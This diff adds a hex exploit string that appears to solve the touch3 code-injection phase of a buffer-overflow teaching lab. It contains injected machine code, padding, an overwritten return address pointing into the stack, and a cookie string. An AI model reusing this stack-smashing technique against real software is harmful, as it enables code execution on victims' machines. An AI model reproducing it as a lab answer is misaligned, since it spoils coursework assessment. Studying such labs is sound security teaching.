@@ -1,0 +1,8 @@
+48 c7 c7 50 21 64 55 c3 /* set cookie */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+18 21 64 55 00 00 00 00 /* address of %rsp */
+79 5c 55 55 55 55 00 00 /* address of touch3 function */
+37 32 37 39 31 65 32 61 /* cookie string */
